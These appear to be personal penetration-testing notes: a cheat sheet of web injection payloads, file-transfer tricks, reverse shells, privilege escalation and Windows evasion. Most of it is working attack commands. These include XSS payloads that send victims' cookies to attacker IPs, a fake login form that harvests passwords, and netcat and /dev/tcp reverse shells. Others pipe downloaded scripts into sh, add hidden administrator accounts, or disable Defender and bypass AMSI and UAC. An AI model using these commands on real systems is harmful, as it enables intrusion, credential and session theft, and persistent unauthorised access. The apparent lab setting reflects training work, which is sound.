- If the parameter is printing a file from the a local system, it has to save the file in www.data for it to be able to display it. 

  Thus, in the backend it will do something like `cat $1 > out.txt` and the command injection while be: `/etc/passwd; whoami; #`

#### SSTI 

**Template Engines** are used to display dynamically generated content on a web page. They replace the variables inside a template file with actual values and display these values to the client.

**Server-side template injection** is a vulnerability where the attacker injects malicious input into a template in order to execute commands on the server.

![image-20240922190834802](/home/damuna/.config/Typora/typora-user-images/image-20240922190834802.png)

If an SSTI exists, after submitting one of these:

`{{7*7}}`
`${7*7}`
`<%= 7*7 %>`
`${{7*7}}`
`#{7*7}`

the web server will detect these expressions as valid code and attempt to execute them, in this instance calculating the mathematical equation 7*7, which is equal to 49.

An error message can indicate what is the engine used, one can then perform research on how to exploit the particular template.

Confirmation

- `<%'${{/#{@}}%>{{`
- `{{7*7}}${7*7}<%= 7*7 %>${{7*7}}#{7*7}[7*7]${{<%[%'"}}%\`
- Errors / Reflection → Check Template Documentation + Exploits

[Payloads](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection)

### Client-side

#### Authentication

##### Type Juggling

PHP type juggling vulnerability occurs when a loose comparison operator  (== or!=) is used in the place of a strict comparison operator (===  or!==). 

![image-20241021201733300](/home/damuna/.config/Typora/typora-user-images/image-20241021201733300.png)

E.g. the following php code handling an authentication is vulnerable:

```php
if (strcmp($username , $_POST['username']) == 0) {
	if (strcmp($password, $_POST['password']) == 0) {
```

To exploit it, one can change the POST data of the web request in an empty array, since If we convert those variables into empty arrays ( `$username[] & $password[]`), the comparison will return NULL , and NULL == 0 will return true, causing the login to be successful.

#### XSS 

##### Generalities:

Cross-site scripting (XSS) allow an attacker to masquerade as a victim user

- **Types:**
  - [Reflected XSS](https://portswigger.net/web-security/cross-site-scripting/reflected) input is processed by the *backend* and displayed on the page
  - [Stored XSS](https://portswigger.net/web-security/cross-site-scripting/stored) (persistent or second-order XSS) input is stored on the back-end database and then displayed upon retrieval (e.g., posts or comments)
  - [DOM-based XSS](https://portswigger.net/web-security/cross-site-scripting/dom-based) input is processed by the *frontend* and displayed on the page

- **Tools**

  - BeeXssHunter
  - `~/TOOLS/python xsstrike.py -u []`
  - Payloads: [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS Injection/README.md), [PayloadBox](https://github.com/payloadbox/xss-payload-list)

##### Exploit

- **Check the Payload on yourself** (a sintax check to see if it valid javascript)

  ```html
  data:text/html,<script>prompt()</script>
  ```

- **Verify:**

  - Check all parameters (also header!)

  - Payloads Prefix: `'"></script></title></style></textarea>`

  - Reflected

    - Payload with `prompt(document.domain)` function

      ```html
      <script>prompt(document.domain)</script>
      <script/src="data:;base64,cHJvbXB0KGRvY3VtZW50LmRvbWFpbikK"></script>
      <svg/onload=eval(atob("cHJvbXB0KGRvY3VtZW50LmRvbWFpbikK"));>
      ```

  - Blind

    - Take the reflected payloads before, and replace `prompt(document.domain)` and its base64 encoded version with:

      ```javascript
      xhr=new XMLHttpRequest;xhr.open("GET","http://10.10.14.190:8888/");xhr.send();
      ```

    - Javascript payload in `evil.js` 

      ```bash
      <script src="http://10.10.14.190:8888/evil.js"></script>
      ```

  - Other payloads: [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS Injection/README.md)

- **Login form Injection**

  1. Open a server

  2. Write a malicios login form using  `document.write('[CODE HERE]')`

     ```html
     <h3>Please login to continue</h3><form action=http://10.10.14.141:8888><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>
     ```

- **Cookie stealing**

  Steals cookies to hijack a logged-in session (If they have `HttpOnly: False`)

  ```javascript
  new Image().src="http://10.10.14.3:8888/?c="+btoa(document.cookie);
  ```

  ```javascript
  xhr=new XMLHttpRequest;xhr.open("GET","http://10.10.14.3:8888/?c="+btoa(document.cookie));xhr.send();
  ```

  It will output cookies in base64 (`;` is the splitting charachters for cookies

  1. Extension cookie editor
  2. Add (bottom left)
  3. Save & Refresh

  You can now FUZZ with `-H "Cookie:""`

- **Request Forgery**

  Perform a request on behalf of the victim user and get the response back to to you

  ```javascript
  function b(){sr=new XMLHttpRequest;sr.open("GET","http://10.10.14.3:8888/?c"+btoa(this.responseText));sr.send();};xhr=new XMLHttpRequest;xhr.open("[METHOD]","[URL]");xhr.withCredentials=true;xhr.onload=b;xhr.send();
  ```

  In the case of POST requests

  - You will need to add a Content-Type header, add this to the payload:

    ```bash
    xhr.setRequestHeader("Content-Type","[POST_DATA_TYPE]");
    ```

  - You will need to change `xhr.send()` to:

    ```bash
    xhr.send("[POST_DATA]");
    ```

  - In the case of JSON, adjust `xhr.send()` to:

    ```bash
    xhr.send(JSON.Stringify("[JSON_DATA]"));
    ```



#  Files & shells

Before trying for a shell, it is good practice to **verify code execution**:

1. In the code execute the command:

   ```bash
   ping [YOUR_IP]
   ```

   - `-c 2` (Linux) to only send two ping packages

   - `-n 2` (Windows) to only send two ping packages

2. Open a ping listener:

   ```bash
   sudo tcpdump -i tun0 icmp
   ```

## Web

**Locations:**

- `ls -la /usr/share/webshells`
- `/usr/share/laudanum`
- [Repository](https://github.com/nicholasaleks/webshells)

**Default webroots:**

| Web Server | Default Webroot        |
| ---------- | ---------------------- |
| `Apache`   | /var/www/html/         |
| `Nginx`    | /usr/local/nginx/html/ |
| `IIS`      | c:\inetpub\wwwroot\    |
| `XAMPP`    | C:\xampp\htdocs\       |

**Default extensions:**

- PHP Server

```
.php
.php3
.php4
.php5
.php7

# Less known PHP extensions
.pht
.phps
.phar
.phpt
.pgif
.phtml
.phtm
.inc
```

- ASP Server

```
.asp
.aspx
.config
.cer and .asa # (IIS <= 7.5)
shell.aspx;1.jpg # (IIS < 7.0)
shell.soap
```

- JSP : `.jsp, .jspx, .jsw, .jsv, .jspf, .wss, .do, .actions`

- Perl: `.pl, .pm, .cgi, .lib`

- Coldfusion: `.cfm, .cfml, .cfc, .dbm`

- Node.js: `.js, .json, .node`

## Linux

### File Transfer

#### Writable Directories

- `/var/tmp`
- `/tmp`
- `/dev/shm`

#### HTTP

**Download**

- [GTFOBins](https://gtfobins.github.io/#+file download)
- `httpserv()`
- `curl http://[IP]:8888/[SRC] -o [DEST]` you can pipe command
- `wget http://[IP]:8888/[SRC] -O [DEST]` with `-qO` you can pipe command

**Upload**

1. Create self-signed certificate

   ```bash
   openssl req -x509 -out /tmp/server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
   ```

2. Start Web Server in a new folder

   ```bash
   mkdir /tmp/https && cd /tmp/https
   sudo python3 -m uploadserver 443 --server-certificate /tmp/server.pem
   ```

3. Upload (multiple files can be specified)

   ```bash
   curl -X POST https://[IP]/upload -F 'files=@[FILE]' --insecure
   ```

   `--insecure` since we used a self-signed certificate that we trust.

#### Bash /dev/tcp

As long as Bash version 2.04 or greater is installed (compiled with  --enable-net-redirections), the built-in /dev/TCP device file can be  used for simple file downloads.

1. Connect to the target Webserver

   ```bash
   exec 3<>/dev/tcp/[IP]/[PORT]
   ```

2. HTTP GET Request

   ```bash
   echo -e "GET [FILE] HTTP/1.1\n\n">&3
   ```

3. Print the response

   ```bash
   cat <&3
   ```

#### Upload from server

- `python3 -m http.server 8000`
- `python2 -m SimpleHTTPServer 8000`
- `php -S 0.0.0.0:8000`
- `ruby -run -ehttpd . -p8000`

`curl [URL] -o [FILE_NAME]` to download from the target

#### Netcat

**Download on target**

1. Start netcat on the target

   ```bash
   nc -lvnp 8000 --recv-only > [FILE]
   ```

   If the compromised machine is using Ncat, specify `--recv-only` to close the connection once the file transfer is finished.

2. On our machine, we upload the file on netcat

   ```bash
   nc --send-only [IP] [PORT] < [FILE]
   ```

If we don't have Netcat or Ncat on our compromised machine, Bash supports read/write operations on a pseudo-device file [/dev/TCP/](https://tldp.org/LDP/abs/html/devref1.html). Writing to this particular file makes Bash open a TCP connection to `host:port`, and this feature may be used for file transfers.

1. Open listener on you machine

   ```bash
    sudo ncat -l -p 443 --send-only < SharpKatz.exe
   ```

2. On the target:

   ```bash
   cat < /dev/tcp/192.168.49.128/443 > SharpKatz.exe
   ```

#### B64

1. Encode the file

```bash
cat [FILE] |base64 -w 0;echo
```

2. Copy the string

3. Go on the remote host, decode

```bash
echo -n [STRING] | base64 -d > [FILE_NAME]
```

**Validate Transfer**

`file`: validates the format of a file

`md5sum` validates the hash of the filestomi

#### SSH

1. Enable SSH server

   ```bash
   sudo systemctl enable ssh
   ```

2. Start the server

   ```
   sudo systemctl start ssh
   ```

3. Check for listening port

   ```bash
   netstat -lnpt
   ```

4. Download on your machine

   ```bash
   scp user@remotehost:[FILE_PATH]
   ```

To upload:

```bash
scp [FILE] user@targethost:[OUTPUT LOCATION]
```

### Shells & Payloads

#### TTY upgrade

- General method (if python is not installed)

```bash
script -qc /bin/bash /dev/null
```

- Python method (try different python versions)

```bash
# In reverse shell
$ python3 -c 'import pty; pty.spawn("/bin/bash")'	#usually good enough

# Follow-Up
$ CTRL+Z -> stty raw -echo; fg -> reset -> export TERM=scr
# Type 'xterm' if it asks for teminal type
```

#### Bash / Netcat payloads

- `sh -i >& /dev/tcp/[KALI_IP]/[PORT] 0>&1`
- `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|cmd -i 2>&1|nc [KALI_IP] [PORT] >/tmp/f` 
- `busybox nc [KALI_IP] [PORT] -e sh`

#### CURL / WGET

- `httpserv()`
- `wget -q -O - http://[KALI_IP]/[PAYLOAD.SH] | sh`
- `curl -s http://[KALI_IP]/[PAYLOAD.SH] | sh`

#### SSH Hijacking (offline)

- `ssh-keygen -t ed25519 -f [KEY_FILE]`
- Paste Your Public Key  -> `/home/[VICTIM_USER]/.ssh/authorized_keys`
- Set Permission             -> `chmod 600 [KEY_FILE]`
- Login                              -> `ssh -i [KEY_FILE] [USER]@[IP]`

#### MSFVenom

- Executable Upload
  - `metash()`
    - ELF              → `chmod +x [FILE]`
    - ELF-SO        → SO Hijacking
  - PHP             → `-p php/meterpreter/reverse_tcp -f raw`
  - WAR / JSP   → `-p java/shell_reverse_tcp -f war`
- Buffer Overflow (BOF) Shellcode
  - `msfvenom -a [x86/x64] -p [SHELL_TYPE] -f [python/c] -b [BAD_CHARS] -e [ENCODER] -i 3 --smallest` 
  - Encoders         → `x86/shikata_ga_nai` / `x86/unicode_m`
  - Extra Options → `BufferRegister=EAX` / `Exitfunc=thread`

#### Metasploit

- Staged (more stable):   

  `set payload linux/[x86/X64]/shell/[BIND/REVERSE]_tcp`

- Stageless (stelthier): 

  `set payload linux/[x86/X64]/shell_[BIND/REVERSE]_tcp`

#### Offline bash Payloads 

~when you have RCE on a root process

- Make bash a SUID

  `chmod u+s /bin/bash` → `/bin/bash -p`

- Make a general binary from [GTFOBin](https://gtfobins.github.io/) a SUID (if bash is not available):

  `chmod u+s [GTFO_BINARY]` -> Exploit following GTFObin

- Make the shadow hashes readable:

  `chmod u+r /etc/shadow`  → Hash Cracking

- Make `/etc/passwd` writable:

  `chmod u+w /etc/passwd`  → Remove `x` from root → `su - root`

- Give to a User that you can control `sudo su` privileges

  `echo "[USER] ALL=(ALL) NOPASSWD: ALL" | tee /etc/sudoers.d/[USER]` 

- Create User with sudo priviledges  -> you can execute sudo without password

  ```bash
  usermod [USER] --password $(echo [PASS] | openssl passwd -1 -stdin)
  usermod -aG sudo [USER]
  ```

#### Shared Folders Payloads (NFS, Docker..)

- **SUID bin:**

  1. Transfer /bin/bash (or another binary) on the shared folder (preferibly from the Host, if possible, to avoid compatibility issues)
  2. From Kali, make it a SUID `chmod u+s /bash`
  3. From the host `/bash -p`

- **C script**, since C produces a binary

  1. On the Host (to avoid compatibility issues), write and compile:

     ```c
     #include <stdio.h>
     #include <sys/types.h>
     #include <unistd.h>
     #include <stdlib.h>
     
     int main(void)
     {
       setuid(0); setgid(0); system("/bin/bash");
     }
     ```

  1. On Kali, in the mounted folder:

     ```bash
     chown root:root shell
     chmod u+s shell
     ```

  1. On the Host: `.\shell`

- **MSV malware**

### Restricted shells

A restricted shell is a type of shell that limits the user's ability to execute commands, they are `rbash`, `rksh`, and `rzsh`.

#### Enumeration

```bash
export -p # It spits out all the variables set
env # It gives the $SHELL and $PATH variable
echo $0 # It gives the $SHELL name
echo $PATH # It gives the path variable
```

To see which commands are executable &rarr; [GTFObins](https://gtfobins.github.io/#+shell)

- `help` `?` `info`
- Executable commands: `compgen -c`
- List the commands in you PATH:
  - `ls [PATH]`
  - `[PATH] and hit tab twice `
  - `echo [PATH]/*`
- File read `echo "$(<a.txt )"`

#### Exploit

- **SSH login** 
  
  ```bash
  ssh [AUTH] -t /bin/sh
  ssh [AUTH] -t sh
  ssh [AUTH] -t "/bin/bash --no-profile"
  ssh [AUTH] -t "bash --no-profile"
  ```
  
- **Command Injection**

  - E.g. if we can only execute `ls -l -a` &rarr; ``ls -l `pwd` ``

- **Command Chaining**
  - `;`, `|`, `&&`

- **Environment Variables**
  - `echo $PATH`

  - change the value of the enviroment variable

    ```bash
    export PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
    ```

  - specify a different directory to execute commands from

- **Shell functions**
  - defining a shell function that executes a command

## Windows

### File Transfer

Check for a writable directory &rarr; Open a server &rarr; Use a download/upload method

#### Writable Directories

To check permissions over an object -> `icacls [DIR/FILE]` Check for RX,WD or F

- `c:\windows\temp\`
- `c:\windows\tracing\`
- `C:\windows\tasks\`
- `c\windows\system32\spool\drivers\color\`

#### WinRM

If you have a winRM shell, you can simply use the commands `upload` and `download` to transfer files from the folder you used to connect to winRM.

#### SMB

1. Create SMB server

   ```bash
   smbserv 
   ```

   New versions of Windows block unauthenticated guest access, in this case you need to set unsername and password in SMB

   ```bash
   smbserver.py -ip $tunip -username USER -password PASS share . 
   ```

2. Download to the target

   ```cmd
   copy \\[YOUR IP]\share\[FILE]
   ```

   If you need credentials:

   ```cmd
   net use n: \\[YOUR IP]\share /user:hacker password
   copy n:\[FILE]
   ```

​	`-smb2support` is a flag if SMB1 is not allowed

#### WebDAV 

Commonly enterprises don't allow the SMB protocol (TCP/445) out of  their internal network because this can open them up to potential  attacks. An alternative is to run SMB over HTTP with `WebDav`.

1. Open WebDav

   ```bash
   sudo wsgidav --host=0.0.0.0 --port=[PORT] --root=/tmp --auth=anonymous 
   ```

2. Connect to WebDav

   ```powershell
   > dir \\[IP]\DavWWWRoot
   ```

3. Upload with SMB

   ```powershell
   > copy [FILE] \\[IP]\DavWWWRoot\
   ```

#### HTTP

- Open http server `httpserv()`

- Download the file from the server:

  - certutil (works on both 32 and 64)

    ```cmd
    certutil.exe -urlcache -split -f [HTTP_SERVER]/[INPUT] [OUTPUT]
    ```

  - bitsadmin

    ```cmd
    bitsadmin /transfer wcb /priority foreground [HTTP_SERVER]/[INPUT] [OUTPUT]
    ```

  - Other Win native binaries: [LOLBAS](https://lolbas-project.github.io)

  - Powershell

    - ```cmd
      powershell -c (New-Object System.Net.WebClient).DownloadFile('http://[KALI_IP]:8888/[SRC]', '[DEST]')
      ```

    - ```bash
      powershell wget http://[KALI_IP]:8888/[SRC] -o [DEST]
      ```

- Upload the file on the server

  - To Kali → `. .\PSUpload.ps1` + `Invoke-FileUpload -Uri http://[KALI_IP]:8888/[DEST] -File [SRC]`

#### Python server

1. Open a server

   ```bash
   python3 -m uploadserver
   ```

2. Upload via Invoke-RestMethod

   ```cmd
   > IEX(New-Object Net.WebClient).DownloadString('[LINK]')
   > Invoke-FileUpload -Uri http://[IP]/upload -File [FILE PATH]
   ```

#### Netcat + Base64

1. Open netcat listener

   ```bash
   listen 8000	
   ```

2. Send the file by using `Invoke-WebRequest` or `Invoke-RestMethod` in base 64

   ```powershell
   > $b64 = [System.convert]::ToBase64String((Get-Content -Path '[PATH]' -Encoding Byte))
   > Invoke-WebRequest -Uri http://[IP]/ -Method POST -Body $b64
   ```

3. Decode

   ```bash
   echo <base64> | base64 -d -w 0 > hosts
   ```

#### FTP

- `ftpserv()`

- Download

  ```cmd
  powershell -c (New-Object Net.WebClient).DownloadFile('ftp://[KALI_IP]:2121/[SRC]', '[DEST]')
  ```

- Upload:

  ```cmd
  (New-Object Net.WebClient).UploadFile('ftp://[KALI_IP]:2121/[DEST]', '[SRC]')`
  ```

- If the shell is not interactive, you can create an FTP command file to download the file. Use `PUT` instead of `GET` to upload.              

  ```cmd-session
  C:\htb> echo open 192.168.49.128 > ftpcommand.txt
  C:\htb> echo USER anonymous >> ftpcommand.txt
  C:\htb> echo binary >> ftpcommand.txt
  C:\htb> echo GET file.txt >> ftpcommand.txt
  C:\htb> echo bye >> ftpcommand.txt
  C:\htb> ftp -v -n -s:ftpcommand.txt
  ftp> open 192.168.49.128
  
  ftp> USER anonymous
  ftp> GET file.txt
  ftp> bye
  
  C:\htb>more file.txt
  This is a test file
  ```

#### Base 64

`cmd` has a maximum string length of  8,191 characters. Also, a web shell may error if you attempt to send extremely large strings. 

**Download:**

1. check the encoding to compare later:

   ```bash
   md5sum [FILE]
   ```

2. encode a file to a base64 string

   ```bash
   cat [FILE] |base64 -w0;echo
   ```

3. copy the string, paste it in the Windows terminal and decode:

   ```cmd
   [IO.File]::WriteAllBytes("[LOCATION]", [Convert]::FromBase64String("[STRING]"))		
   ```

4. Check if everything went correctly:

   ```cmd
   Get-FileHash [LOCATION] -Algorithm md5
   ```

**Upload**

1. Encode with Powershell

   ```powershell
   [Convert]::ToBase64String((Get-Content -path "[PATH]" -Encoding byte))
   ```

2. Check MD5 hash to check later if the procedure was successsfull

   ```powershell
   Get-FileHash "[PATH]" -Algorithm MD5 | select Hash	
   ```

3. Copy paste point 1. and decode in your machine

   ```bash
   echo [STRING] | base64 -d > hosts
   ```

4. Check if the procedure was correct by comparing with 2.:

   ```bash
   md5sum hosts
   ```

#### RDP

If copying with `xfreerdp` doesn't work:

- Mount a Linux folder

  ```bash
  xfreerdp /v:[IP] /d:[DOMAIN] /u:[USER] /p:[PASSWD] /drive:linux,/home/plaintext/htb/academy/filetransfer
  ```

-  To access the directory, we can connect to `\\tsclient\`, allowing to transfer files

#### Powershell

Defenders can use Web filtering solutions to prevent access to specific website categories, block the download of file types (like .exe), or only allow access to a list of whitelisted domains.

***Errors:***

- There may be cases when the Internet Explorer first-launch configuration has not been completed, which prevents the download. This can be bypassed using the parameter `-useb`.

- If the certificate is not trusted:

  ```powershell
  [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
  ```

***WebClient methods for downloading data from a resource:***

- [OpenRead](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.openread?view=net-6.0): Returns the data from a resource as a [Stream](https://docs.microsoft.com/en-us/dotnet/api/system.io.stream?view=net-6.0).

- [OpenReadAsync](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.openreadasync?view=net-6.0): Returns the data from a resource without blocking the calling thread.

- [DownloadData](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloaddata?view=net-6.0): Downloads data from a resource and returns a Byte array.

  - File Download:

    ```cmd
    (New-Object Net.WebClient).DownloadFile('<Target File URL>','<Output File Name>')
    ```

    The `WebClient` class provides methods for sending HTTP requests and handling responses, like downloading or uploading data.

  - Fileless (directly execute)

    ```cmd
    IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com')
    ```

    You can add ` | IEX` to send pipeline input.

- [DownloadDataAsync](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloaddataasync?view=net-6.0): Downloads data from a resource and returns a Byte array without blocking the calling thread.

- [DownloadFile](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadfile?view=net-6.0): Downloads data from a resource to a local file.

- [DownloadFileAsync](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadfileasync?view=net-6.0): Downloads data from a resource to a local file without blocking the calling thread.

- [DownloadString](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadstring?view=net-6.0): Downloads a String from a resource and returns a String.

- [DownloadStringAsync](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadstringasync?view=net-6.0): Downloads a String from a resource without blocking the calling thread.

-  [Invoke-WebRequest](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-webrequest?view=powershell-7.2) cmdlet is also available, but it is noticeably slower at downloading files. You can use the aliases `iwr`, `curl`, and `wget` instead of the `Invoke-WebRequest` full name.

   ```cmd
   Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1
   ```

   - Evading detection:

     If some User Agents were blacklisted, [Invoke-WebRequest](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-webrequest?view=powershell-7.1) contains a UserAgent parameter, which allows for changing the default  user agent to one emulating Internet Explorer, Firefox...

     ```powershell
     $UserAgent = [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome
     ```

     And add the flag `-UserAgent $UserAgent` to the download command

#### Programming languages

##### Python 

```bash
python3 -c 'import urllib.request;urllib.request.urlretrieve("[LINK]", "[FILE]")'
```

**Upload:** 

1. Start a python server

   ```bash
   python3 -m uploadserver
   ```

2. Upload:

   ```bash
   python3 -c 'import requests;requests.post("[MY URL]",files={"files":open("[FILE]","rb")})'
   ```

You can also use `python2.7`

Notice that the `LINK` should include the path including the file.

##### php

File_get_contents()

```bash
php -r '$file = file_get_contents("[LINK]");file_put_contents("[FILE]",$file);'
```

Fopen()

```bash
php -r 'const BUFFER = 1024; $fremote = 
fopen("[LINK]", "rb"); $flocal = fopen("[FILE]", "wb"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'
```

Pipe to Bash

```bash
php -r '$lines = @file("[LINK]"); foreach ($lines as $line_num => $line) { echo $line; }' | bash
```

##### Ruby                                                                                                                    

```bash
ruby -e 'require "net/http"; File.write("[FILE]", Net::HTTP.get(URI.parse("[LINK]")))'
```

##### Perl                                                                                                                         

```bash
perl -e 'use LWP::Simple; getstore("[LINK]", "FILE");'
```

##### Javascript

1. create a file called `wget.js` and save the following content:

   ```javascript
   var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
   WinHttpReq.Open("GET", WScript.Arguments(0), /*async=*/false);
   WinHttpReq.Send();
   BinStream = new ActiveXObject("ADODB.Stream");
   BinStream.Type = 1;
   BinStream.Open();
   BinStream.Write(WinHttpReq.ResponseBody);
   BinStream.SaveToFile(WScript.Arguments(1));
   ```

2. Execute from Windows:

   ```cmd
   cscript.exe /nologo wget.js [LILNK] [FILE]
   ```

##### VBScript

1. create a file called `wget.vbs` and save the following content:

   ```vbscript
   dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
   dim bStrm: Set bStrm = createobject("Adodb.Stream")
   xHttp.Open "GET", WScript.Arguments.Item(0), False
   xHttp.Send
   
   with bStrm
       .type = 1
       .open
       .write xHttp.responseBody
       .savetofile WScript.Arguments.Item(1), 2
   end with
   ```

2. Execute from Windows:

   ```cmd
   cscript.exe /nologo wget.js [LILNK] [FILE]
   ```

### Shells

#### Metasploit 

- Staged (more stable):   

  `set payload windows/[EMPTY/X64]/shell/[BIND/REVERSE]_tcp`

- Stageless (sthelthier): 

  `set payload windows/[EMPTY/X64]/shell_[BIND/REVERSE]_tcp`

#### SMB / WebDAV

- `smbserv()`                                          → Open Anonymous Server
- `cp /usr/share/windows-binaries/nc[32/64].exe .`    → Place NC in SMB Share
- `\\[KALI_IP]\nc64.exe -e cmd.exe [KALI_IP] [PORT]`  → Input NC Shell Payload
- WebDAV Method                                  → `webdavserv()` + `\\[KALI_IP]:8000\DavWWWRoot\`  

#### Powershell

- `powershell -c iex(New-Object System.Net.WebClient).DownloadString('http://[SERVER]/[PS1_FILE]');[FUNCTION_CALL]`
- `powershell [-e / /enc] [B64_STRING]`                     → [B64 Reverse Shell](https://www.revshells.com/)
- `echo '[CMD]' | iconv -f ascii -t utf-16le | base64 -w0`  → CMD to PS-B64 Conversion

#### Admin Hijacking

- `msfvenom -p windows/[x64/empty]/exec CMD="net user hacker pass123 /add" -f [FORMAT]`
- `msfvenom -p windows/[x64/empty]/exec CMD="net localgroup Administrators hacker /add" -f [FORMAT]`
- `msfvenom -p windows/[x64/empty]/exec CMD="net group [DOMAIN_GROUP] hacker /add" -f [FORMAT]`
- Remote Access → Add `hacker` to RDP / WinRM Groups

#### SSH Hijacking

- `ssh-keygen` → Paste your public key in `C:\Users\[USERNAME]\.ssh\authorized_keys`
- `chmod 600 [KALI_PRIVATE_KEY_FILE]`
- `ssh -i [KALI_PRIVATE_KEY_FILE] [USER]@[IP]`

#### MSFVenom

- Executable Upload
  - `metash()`
  - IIS           → ASP / ASPX
  - CMD        → EXE / DLL / MSI / PS1
  - Link/Macro  → HTA / VBA / VBS
  - PHP         → `-p php/meterpreter/reverse_tcp -f raw`
  - WAR        → `-p java/shell_reverse_tcp -f war`
  - JSP          → `-p java/shell_reverse_tcp -f raw`
- BOF Shellcode
  - `-a [x86/x64] -p [SHELL_TYPE] -f [python/c] -b [BAD_CHARS] -e [32_BIT_ENCODER] -i 3 --smallest` → Place in Exploit
  - Encoders      → `x86/shikata_ga_nai` / `x86/unicode_m`
  - Extra Options  → `BufferRegister=EAX` / `Exitfunc=thread`
  - Auto-Migration
    - Useful when Process Crashes
    - `echo "run post/windows/manage/migrate" > ~/automigrate.rc`
    - In `multi/handler` MSF Panel → `set AutoRunScript multi_console_command -r ~/automigrate.rc`

### Evasion

#### Antivirus Evasion

You have an antivirus when you cannot execute malwares [Hacktricks](https://book.hacktricks.wiki/en/windows-hardening/av-bypass.html)

- Enumeration
  - `wmic /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntivirusProduct Get displayName`
  - `Get-MpComputerStatus`
- Folder Exclusion Bypass
  - Check Folders -> `reg query "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths"`
  - Place Malware in Allowed Folder
- Disable AV (Code Execution as Admin)
  - `powershell Set-MpPreference -DisableIOAVProtection $true`
  - `powershell Set-MpPreference -DisableRealTimeMonitoring $true`
- Malware Obfuscation tools:
  - `msfvenom -p [WINDOWS_PAYLOAD] LHOST=[NIC] LPORT=4444 -f exe -x [WIN_BINARY] > out.exe` -> Choose "whoami" / "ping" / "plink"
  - [Ebowla](https://0xdf.gitlab.io/2019/02/16/htb-giddy.html)
  - Prometheus Shell
    - [Download](https://github.com/paranoidninja/0xdarkvortex-MalwareDevelopment/blob/master/prometheus.cpp) + Change IP & Port
    - 32/64-Bit Cross-Compile → `[i686-w64-mingw32-g++ / g++] prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc`

#### Powershell evasion

- Execution Policy
  - `powershell -noni -nop -ep bypass -w hidden -NoExit [COMMAND]`
  - `Set-ExecutionPolicy Bypass -Scope Process` -> From a PS Session
  - 32/64-Bit Execution
    - Try Both Binaries
    - `c:\windows\syswow64\windowspowershell\v1.0\powershell.exe`
    - `c:\windows\sysnative\windowspowershell\v1.0\powershell.exe`
- AMSI
  - Paste the payload in a PS session to bypass AMSI
  - [Payloads Here](https://amsi.fail)
- Constrained Language
  - Check if enabled -> `$ExecutionContext.SessionState.LanguageMode`
  - [Bypasses](https://sp00ks-git.github.io/posts/CLM-Bypass/)
- AppLocker: excludes some folders that you can execute powershell from
  - `Get-AppLockerPolicy -Effective | select -exp RuleCollections` 
  - [Bypasses](https://github.com/api0cradle/UltimateAppLockerByPassList) / Run Scripts from Allowed Folders

#### UAC

When you are member of Administrators, but you have restricted privileges and file access of a true SYSTEM user

- Enumeration
  - Member of "Administrators" + Restricted Privileges / File Access
  - `reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA` -> Check if greater than "0"
  - `reg query HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin` -> Check if greater than "0"
- Bypasess
  - `[environment]::OSVersion.Version` → [UACME](https://github.com/hfiref0x/UACME) + [Checklist](https://academy.hackthebox.com/module/67/section/626) + Google Search
  - Send Reverse Shell                            → Through a SYSTEM RCE / Similar Exploit
  - GUI Access                        → CMD “Run as Administrator” → Input Credentials
  - EventViewer Method
    - [Load Module](https://github.com/CsEnox/EventViewer-UACBypass) → `Import-Module Invoke-EventViewer`
    - Exploit            → `Invoke-EventViewer [PATH\TO\MALWARE.exe]`
  - PSExec (Local / Remote)
    - `PsExec.exe -h -s -i cmd` -> No Credentials
    - `psexec.py [AUTH_STRING]` -> Requires Credentials

## Metasploit

### Sessions

Multiple sessions can be handled:

in `msfconsole`:

```bash
sessions			# visualize active session
sessions -i [no.]	# switch session
```

Background the current session with `[CTRL] + [Z]`

The `jobs` command lets you handle active jobs:

- An exploit can be run as a job by typing `exploit -j`
- To list all running jobs  `jobs -l` 

- To kill a specific job  `kill [index no.]` 
- `jobs -K`  to kill all running jobs.

### Search

In `msfconsole`:

```bash
search [exploit]

use [number exploit]
info
options

show target				# show OS/language version/service pack
set target [alue]

set [option] [value]	# use setg to set permanently

run
```

In the search we can specify 

- the  year (`cve:<year>`), 
- the platform Windows (`platform:<os>`), 
- the type of module we want to find (`type:<auxiliary/exploit/post>`), 
- the reliability rank (`rank:<rank>`), 
- the search name (`<pattern>`). 

| **Type**    | **Description**                                              |
| ----------- | ------------------------------------------------------------ |
| `Auxiliary` | Scanning, fuzzing, sniffing, and admin capabilities. Offer extra assistance and functionality. |
| `Encoders`  | Ensure that payloads are intact to their destination.        |
| `Exploits`  | Defined as modules that exploit a vulnerability that will allow for the payload delivery. |
